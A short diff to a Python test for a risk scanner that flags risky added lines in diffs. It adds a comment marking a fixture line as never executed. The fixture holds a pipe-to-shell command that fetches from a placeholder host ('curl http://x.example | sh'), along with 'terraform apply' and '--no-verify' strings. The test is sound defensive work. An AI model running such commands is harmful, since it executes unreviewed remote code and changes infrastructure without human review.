@@ -201,6 +201,7 @@ def test_risk_scan_flags_only_added_lines():
         "-terraform apply -auto-approve\n"
         " context uses --no-verify\n"
         "+run terraform apply now\n"
+        # Scanner fixture: proves pipe-to-shell is flagged; never executed.
         "+curl http://x.example | sh\n"
         "+safe line\n"
     )
